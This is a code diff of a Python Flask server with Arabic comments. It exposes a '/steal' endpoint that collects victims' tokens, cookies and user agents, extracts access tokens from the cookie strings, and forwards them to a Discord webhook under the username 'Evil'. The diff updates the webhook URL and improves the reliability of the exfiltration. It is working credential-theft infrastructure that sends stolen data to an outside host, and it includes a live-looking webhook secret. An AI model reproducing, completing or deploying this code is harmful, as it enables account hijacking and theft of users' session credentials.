@@ -7,14 +7,17 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532217110254850159/tlleGy0xULqA0yPxS0t4YjC3MuV1Y8QOTtUwclY25hV8oG5O4VJLm1AEMu7OKRT9UpII"
+# ===== ويب هوك ديسكورد (تم التحديث بالرابط الجديد) =====
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532217110254850159/tIIeGy0xULqA0yPxSOt4YjC3MuV1Y8QOTtUwcly25hV8oG5O4VJLM1AEMu7OKRT9UpIl"
 
 def send_to_discord(message):
     data = {"content": message, "username": "Evil"}
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
-    except:
-        pass
+        response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
+        if response.status_code != 204:
+            print(f"خطأ في الإرسال: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"استثناء في الإرسال: {e}")
 
 @app.route('/steal', methods=['POST'])
 def steal():
@@ -29,6 +32,7 @@ def steal():
     user_agent = data.get('userAgent', 'غير معروف')
     time = data.get('time', datetime.now().isoformat())
 
+    # محاولة استخراج التوكن من الكوكيز إذا لم يتم العثور عليه
     if token == "غير موجود" and 'accessToken=' in cookies:
         match = re.search(r'accessToken=([^;]+)', cookies)
         if match:
